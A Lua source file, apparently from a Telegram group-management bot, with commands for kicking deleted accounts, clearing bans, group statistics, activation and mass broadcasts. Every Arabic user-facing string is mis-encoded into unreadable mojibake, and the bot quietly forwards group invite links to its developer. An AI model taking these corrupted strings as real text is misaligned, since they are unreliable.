local pin_id = Devmfm:get(mustafa..'mfm:PinnedMsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุงุนุงุฏุฉ ุชุซุจูุช ุงูุฑุณุงูู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end end
end
if text == 'ุทุฑุฏ ุงููุญุฐูููู' or text == 'ูุณุญ ุงููุญุฐูููู' or text == 'ุทุฑุฏ ุงูุญุณุงุจุงุช ุงููุญุฐููู' or text == 'ุญุฐู ุงููุญุฐูููู' then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุทุฑุฏ ุงููุญุฐูููู")  
end,nil)
end
if text and text:match("^ูุณุญ ุงููุญุธูุฑูู$") or text and text:match("^ุญุฐู ุงููุญุธูุฑูู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงููุทุฑูุฏูู$") or text and text:match("^ุญุฐู ุงููุทุฑูุฏูู$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_mfm(msg.chat_id_, msg.id_, 0,'โ๏ธ*ูุง ููุฌุฏ ูุญุธูุฑูู*', 1, 'md')
Devmfm:del(mustafa..'mfm:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
Devmfm:del(mustafa..'mfm:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููุญุธูุฑูู")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
if text and text:match("^ูุนูููุงุช ุงููุฌููุนู$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงูุงุนุถุงุก$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงููุฑูุจ$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงูุงุฏูููู$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงููุญุธูุฑูู$") and ChCheck(msg) then
local Muted = Devmfm:scard(mustafa.."mfm:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุฌููุนู โซ โจ '..dp.title_..' โฉ\nโ๏ธุงูุงูุฏู โซ โจ '..msg.chat_id_..' โฉ\nโ๏ธุนุฏุฏ ุงูุงุนุถุงุก โซ โจ *'..data.member_count_..'* โฉ\nโ๏ธุนุฏุฏ ุงูุงุฏูููู โซ โจ *'..data.administrator_count_..'* โฉ\nโ๏ธุนุฏุฏ ุงููุทุฑูุฏูู โซ โจ *'..data.kicked_count_..'* โฉ\nโ๏ธุนุฏุฏ ุงูููุชูููู โซ โจ *'..Muted..'* โฉ\nโ๏ธุนุฏุฏ ุฑุณุงุฆู ุงููุฌููุนู โซ โจ *'..(msg.id_/2097152/0.5)..'* โฉ\nโ โ โ โ โ โ โ โ โ\n', 1, 'md') 
end,nil)
end,nil)
end
if text and text:match('^ูุดู (-%d+)') then
local ChatId = text:match('ูุดู (-%d+)') 
if not SudoBot(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑูู ููุท', 1, 'md')
else
local ConstructorList = Devmfm:scard(mustafa.."mfm:Constructor:"..ChatId) or 0
local BanedList = Devmfm:scard(mustafa.."mfm:Ban:"..ChatId) or 0
local ManagerList = Devmfm:scard(mustafa.."mfm:Managers:"..ChatId) or 0
local MutedList = Devmfm:scard(mustafa.."mfm:Muted:"..ChatId) or 0
local TkeedList = Devmfm:scard(mustafa.."mfm:mfm:Tkeed:"..ChatId) or 0
local AdminsList = Devmfm:scard(mustafa.."mfm:Admins:"..ChatId) or 0
local VipList = Devmfm:scard(mustafa.."mfm:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/KKDKKB7' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,mfm) 
if mfm.first_name_ ~= false then
Constructormfm = "["..mfm.first_name_.."](T.me/"..(mfm.username_ or "KKDKKB7")..")"
else 
Constructormfm = "ุญุณุงุจ ูุญุฐูู"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงููุฌููุนู โซ ["..dp.title_.."]("..LinkGroup..")\nโ๏ธุงูุงูุฏู โซ ( `"..ChatId.."` )\nโ๏ธุงูููุดุฆ โซ "..Constructormfm.."\nโ๏ธุนุฏุฏ ุงููุฏุฑุงุก โซ ( *"..ManagerList.."* )\nโ๏ธุนุฏุฏ ุงูููุดุฆูู โซ ( *"..ConstructorList.."* )\nโ๏ธุนุฏุฏ ุงูุงุฏูููู โซ ( *"..AdminsList.."* )\nโ๏ธุนุฏุฏ ุงููููุฒูู โซ ( *"..VipList.."* )\nโ๏ธุนุฏุฏ ุงููุญุธูุฑูู โซ ( *"..BanedList.."* )\nโ๏ธุนุฏุฏ ุงููููุฏูู โซ ( *"..TkeedList.."* )\nโ๏ธุนุฏุฏ ุงูููุชูููู โซ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูู ุชุชู ุงุถุงูุชู ุจูุง ูุงููู ุจูุดููุง", 1, "md")
end
end,nil)
end,nil)
end 
end
if text and text:match("^ุบุงุฏุฑ (-%d+)$")  then
local Text = { string.match(text, "^(ุบุงุฏุฑ) (-%d+)$")}
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงููุฌููุนู โซ ["..dp.title_.."]\nโ๏ธุชูุช ุงููุบุงุฏุฑู ูููุง ุจูุฌุงุญ", 1, "md")
Dev_mfm(Text[2], 0, 1, "โ๏ธุจุงูุฑ ุงููุทูุฑ ุชู ูุบุงุฏุฑุฉ ูุฐู ุงููุฌููุนู ", 1, "md")  
ChatLeave(dp.id_, mustafa)
Devmfm:srem(mustafa.."mfm:Groups", dp.id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูู ุชุชู ุงุถุงูุชู ุจูุง ูุงููู ุจูุบุงุฏุฑุชูุง", 1, "md")
end 
end,nil)
end 
end
if text and text:match("^ุชุนูู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$") and SecondSudo(msg) or text and text:match("^ุชุนููู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$") and SecondSudo(msg) then
local Num = text:match("ุชุนูู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$") or text:match("ุชุนููู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$")
Devmfm:set(mustafa..'mfm:Num:Add:Bot',Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ูุถุน ุนุฏุฏ ุงูุงุนุถุงุก โซ *'..Num..'* ุนุถู', 1, 'md')
end
if text == 'ุชูุนูู ุงูุจูุช ุงูุฎุฏูู' then 
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท', 1, 'md')
else 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุจูุช ุงูุฎุฏูู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:FreeBot'..mustafa) 
end 
end
if text == 'ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู' then 
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท', 1, 'md')
else 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:FreeBot'..mustafa,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'ุชูุนูู ุงูุงูุนุงุจ' and Manager(msg) and ChCheck(msg) or text == 'ุชูุนูู ุงููุนุจู' and Manager(msg) and ChCheck(msg) then   
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุงูุนุงุจ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Games'..msg.chat_id_) 
end
if text == 'ุชุนุทูู ุงูุงูุนุงุจ' and Manager(msg) and ChCheck(msg) or text == 'ุชุนุทูู ุงููุนุจู' and Manager(msg) and ChCheck(msg) then  
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงูุนุงุจ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Games'..msg.chat_id_,true)  
end
if text == "ุชูุนูู ุงูุฑุงุจุท" or text == "ุชูุนูู ุฌูุจ ุงูุฑุงุจุท" then 
if Admin(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุฌูุจ ุฑุงุจุท ุงููุฌููุนู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "ุชุนุทูู ุงูุฑุงุจุท" or text == "ุชุนุทูู ุฌูุจ ุงูุฑุงุจุท" then 
if Admin(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุฌูุจ ุฑุงุจุท ุงููุฌููุนู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
if text and text:match('^ุชูุนูู$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุฌููุนู ุนุงุฏูู ูููุณุช ุฎุงุฑูู ูุง ุชุณุชุทูุน ุชูุนููู ูุฑุฌู ุงู ุชุถุน ุณุฌู ุฑุณุงุฆู ุงููุฌููุนู ุถุงูุฑ ูููุณ ูุฎูู ููู ุจุนุฏูุง ููููู ุฑูุนู ุงุฏูู ุซู ุชูุนููู', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู ุงูู ูู โซ *'..(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0)..'* ุนุถู', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
Devmfm:sadd(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:sadd(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:srem(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุฌููุนู ุจุงูุชุงููุฏ ููุนูู', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","โ๏ธุชู ุชูุนูู ุงููุฌููุนู "..dp.title_)  
Devmfm:sadd(mustafa.."mfm:Groups",msg.chat_id_)
if not Devmfm:get(mustafa..'mfm:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
Devmfm:incrby(mustafa..'mfm:Sudos'..msg.sender_user_id_,1)
Devmfm:set(mustafa..'mfm:SudosGp'..msg.sender_user_id_..msg.chat_id_,"mfm")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ูุง ููุฌุฏ'
end
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"โ๏ธุชู ุชูุนูู ูุฌููุนู ุฌุฏูุฏู โซ โค \nโ โ โ โ โ โ โ โ โ\nโ๏ธุจูุงุณุทุฉ โซ "..Name.."\nโ๏ธุงุณู ุงููุฌููุนู โซ ["..NameChat.."]\nโ๏ธุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู โซ โจ *"..NumMem.."* โฉ\nโ๏ธุงูุฏู ุงููุฌููุนู โซ โค \nโจ `"..msg.chat_id_.."` โฉ\nโ๏ธุฑุงุจุท ุงููุฌููุนู โซ โค\nโจ ["..LinkGroup.."] โฉ\nโ โ โ โ โ โ โ โ โ\nโ๏ธุงูููุช โซ "..os.date("%I:%M%p").."\nโ๏ธุงูุชุงุฑูุฎ โซ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'ุชุนุทูู' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุฌููุนู ุจุงูุชุงููุฏ ูุนุทูู', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","โ๏ธุชู ุชุนุทูู ุงููุฌููุนู "..dp.title_)  
Devmfm:srem(mustafa.."mfm:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ูุง ููุฌุฏ'
end
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"โ๏ธุชู ุชุนุทูู ูุฌููุนู ุฌุฏูุฏู โซ โค \nโ โ โ โ โ โ โ โ โ\nโ๏ธุจูุงุณุทุฉ โซ "..Name.."\nโ๏ธุงุณู ุงููุฌููุนู โซ ["..NameChat.."]\nโ๏ธุงูุฏู ุงููุฌููุนู โซ โค \nโจ `"..msg.chat_id_.."` โฉ\nโ๏ธุฑุงุจุท ุงููุฌููุนู โซ โค\nโจ ["..LinkGroup.."] โฉ\nโ โ โ โ โ โ โ โ โ\nโ๏ธุงูููุช โซ "..os.date("%I:%M%p").."\nโ๏ธุงูุชุงุฑูุฎ โซ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
if text and text:match("^ุงููุทูุฑ$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ูุง ููุฌุฏ'
end
if not Sudo(msg) then
SendText(DevId,"โ๏ธููุงู ูู ุจุญุงุฌู ุงูู ูุณุงุนุฏู โซ โค \nโ โ โ โ โ โ โ โ โ\nโ๏ธุงูุดุฎุต โซ "..Name.."\nโ๏ธุงุณู ุงููุฌููุนู โซ ["..NameChat.."]\nโ๏ธุงูุฏู ุงููุฌููุนู โซ โค \nโจ `"..msg.chat_id_.."` โฉ\nโ๏ธุฑุงุจุท ุงููุฌููุนู โซ โค\nโจ ["..LinkGroup.."] โฉ\nโ โ โ โ โ โ โ โ โ\nโ๏ธุงูููุช โซ "..os.date("%I:%M%p").."\nโ๏ธุงูุชุงุฑูุฎ โซ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if text == 'ุฑูุงุจุท ุงููุฑูุจุงุช' or text == 'ุฑูุงุจุท ุงููุฌููุนุงุช' then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
local List = Devmfm:smembers(mustafa.."mfm:Groups")
if #List == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ููุฌุฏ ูุฌููุนุงุช ููุนูู', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุฌุงุฑู ุงุฑุณุงู ูุณุฎู ุชุญุชูู ุนูู '..#List..' ูุฌููุนู', 1, 'md')
local text = "โ๏ธSource DEMON\nโ๏ธFile Bot Groups\nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local GroupsManagers = Devmfm:scard(mustafa.."mfm:Managers:"..v) or 0
local GroupsAdmins = Devmfm:scard(mustafa.."mfm:Admins:"..v) or 0
local Groupslink = Devmfm:get(mustafa.."mfm:Groups:Links" ..v)
text = text..k.." โฌ โค \nโ๏ธGroup ID โฌ "..v.."\nโ๏ธGroup Link โฌ "..(Groupslink or "Not Found").."\nโ๏ธGroup Managers โฌ "..GroupsManagers.."\nโ๏ธGroup Admins โฌ "..GroupsAdmins.."\nโ โ โ โ โ โ โ โ โ\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(text)
File:close()
local abbas = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local curl = 'curl "' .. abbas .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(curl)
end
end
end
if text == "ุงุฐุงุนู ุจุงูุฎุงุต" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "โซ ุงุฐุงุนู ุฎุงุต โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
Devmfm:setex(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุงุฑุณู ูู ุณูุงุก โซ โค \nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธููุฎุฑูุฌ ุงุฑุณู โซ ( ุงูุบุงุก ) \n โ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุจูุฌุงุญ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
List = Devmfm:smembers(mustafa..'mfm:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
mfmText = "ุงูุฑุณุงูู"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
mfmText = "ุงูุตูุฑู"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
mfmText = "ุงููุชุญุฑูู"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
mfmText = "ุงูููุฏูู"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
mfmText = "ุงูุจุตูู"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
mfmText = "ุงูุตูุช"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
mfmText = "ุงูููู"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
mfmText = "ุงูููุตู"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุฐุงุนุฉ "..mfmText.." ุจูุฌุงุญ \nโ๏ธโุงูู โซ โจ "..#List.." โฉ ูุดุชุฑู \n โ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
if text == "ุงุฐุงุนู" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "โซ ุงุฐุงุนู ุนุงู โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
Devmfm:setex(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุงุฑุณู ูู ุณูุงุก โซ โค \nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธููุฎุฑูุฌ ุงุฑุณู โซ ( ุงูุบุงุก ) \n โ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุจูุฌุงุญ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
List = Devmfm:smembers(mustafa..'mfm:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
mfmText = "ุงูุฑุณุงูู"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
mfmText = "ุงูุตูุฑู"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
mfmText = "ุงููุชุญุฑูู"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
mfmText = "ุงูููุฏูู"
